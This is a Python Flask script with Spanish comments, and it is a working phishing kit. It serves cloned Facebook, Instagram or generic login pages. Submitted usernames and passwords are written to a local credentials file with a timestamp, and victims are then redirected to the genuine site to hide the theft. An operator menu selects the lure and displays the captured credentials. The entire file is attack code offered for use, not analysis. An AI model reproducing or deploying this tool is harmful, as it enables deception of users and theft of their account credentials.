from flask import Flask, render_template_string, request, redirect
from datetime import datetime
from modulos.inicio import banner, banner2, banner3
import os

app = Flask(__name__)
selected_option = None

class FakeLogin:
    def __init__(self):
        pass

    def get_html(self, option):
        # Determinar el contenido HTML y el nombre de la plantilla según la opción seleccionada
        if option == 1:
            with open('template/facebook/index-Facebook.html', 'r', encoding='utf-8') as file:
                contenido = file.read()
            template_name = 'Facebook'
            redirect_url = "https://www.facebook.com"
        elif option == 2:
            with open('template/instagram/index-Instagram.html', 'r') as file:
                contenido = file.read()
            template_name = 'Instragram'
            redirect_url = "https://instagram.com"             
        elif option == 3:
            with open('template/generica/index.html', 'r') as file:
                contenido = file.read()
            template_name = 'Generica'
            redirect_url = "https://wikipedia.org"
        else:
            contenido = "<h1>Página no encontrada</h1>"
            template_name = None
            redirect_url = None
        
        return contenido, template_name, redirect_url

    def handle_login(self, username, password, template_name):
        # Guardar las credenciales y el nombre de la plantilla en un archivo
        with open("credenciales.txt", "a") as f:
            f.write('-----------------------------------------------------------------\n')
            f.write(f"User: {username}\nPass: {password}\nRed: {template_name}\n")
            now = datetime.now()
            hora = now.hour
            minu = now.minute + 1
            f.write(f'Hora: {hora}:{minu}\n')
            f.write('-----------------------------------------------------------------\n')

@app.route('/')
def index():
    # Obtener el contenido HTML y el nombre de la plantilla según la opción seleccionada
    page = FakeLogin()
    contenido, template_name, _ = page.get_html(selected_option)
    return render_template_string(contenido)

@app.route('/fake_login', methods=['POST'])
def fake_login():
    username = request.form['username']
    password = request.form['password']
    
    # Manejar el inicio de sesión y guardar las credenciales
    page = FakeLogin()
    _, template_name, redirect_url = page.get_html(selected_option)  # Obtener el nombre de la plantilla y URL
    page.handle_login(username, password, template_name)  # Guardar las credenciales
    
    return redirect(redirect_url)  # Redirigir a la URL correspondiente

def view_credentiales():
    print('\nCredenciales')
    with open ('credenciales.txt','r') as file:
        credenciales = file.read()
    
    print(f'{credenciales}')
    
def seleccionar_opcion():
    global selected_option
    banner3()
    print('MENU DE OPCIONES:')
    print('1. FACEBOOK')
    print('2. INSTAGRAM')
    print('3. GENERICA')
    print('4. Ver Credenciales capturadas')
    print('5. Salir')
    while True:
        try:
            option = int(input("\nSeleccione una opciÃ³n: "))
            if option in [1, 2, 3]:
                selected_option = option
                break
            if option == 4:
                try:
                    view_credentiales()
                except Exception as e:
                    print('Error en la lectura del archivo o está vacío')
            if option == 5:
                print('Saliendo del programa...')
                exit()
            else:
                print("Opción no válida. Intente nuevamente.")
        except ValueError:
            print("Entrada no válida. Por favor, ingrese un número.")

if __name__ == '__main__':
    while(True):        
        seleccionar_opcion()
        os.system('clear' if os.name == 'posix' else 'cls')
        banner()
        print("Iniciando el servidor Flask...")
        print("Accede al servidor en http://127.0.0.1:5000")
        app.run(host='127.0.0.1', port=5000, debug=False) 
